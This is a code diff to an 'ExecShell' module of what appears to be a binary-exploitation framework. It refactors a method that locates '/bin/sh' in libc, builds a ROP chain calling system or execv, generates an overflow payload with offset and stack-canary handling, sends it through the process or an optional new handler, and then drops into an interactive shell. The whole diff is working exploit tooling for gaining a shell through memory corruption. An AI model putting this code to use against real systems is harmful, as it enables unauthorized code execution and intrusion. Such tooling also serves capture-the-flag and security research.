@@ -16,31 +16,35 @@ class ExecShell(AbstractModule):
     class __TargetType(ITarget, ILibc, IRop): ...
 
     @classmethod
-    def execute(cls, target: __TargetType,
+    def execute(cls,
                 process: AbstractProcess,
                 method: ExecMethod = ExecMethod.SYSTEM,
                 offset: int = 0, leave: bool = False, canary: int | None = None,
+                handler: typing.Callable | None = None,
                 *args, **kwargs) -> typing.Any:
         logger.info(f"Running {cls.__name__} module")
         logger.info("Looking for /bin/sh in the executable")
 
-        bin_sh_ptr = target.libc.find_string(b'/bin/sh\0')
+        bin_sh_ptr = process.target.libc.find_string(b'/bin/sh\0')
         if bin_sh_ptr is None:
             logger.critical(f"Failed to find /bin/sh in libc")
             return None
 
         if method == ExecMethod.SYSTEM:
-            rop_chain = cls._system(target, bin_sh_ptr)
+            rop_chain = cls._system(process.target, bin_sh_ptr)
         elif method == ExecMethod.EXECV:
-            rop_chain = cls._execv(target, bin_sh_ptr)
+            rop_chain = cls._execv(process.target, bin_sh_ptr)
         else:
             logger.critical("Unknown execution method selected")
             return None
 
-        payload = target.generate_payload(rop_chain, offset, leave, canary)
+        payload = process.target.generate_payload(rop_chain, offset, leave, canary)
 
         logger.info(f"Sending payload. Payload size = {hex(len(payload))}")
-        process(payload)
+        if handler:
+            handler(payload)
+        else:
+            process(payload)
 
         logger.success(f"Switching to interactive mode")
         process.interactive()
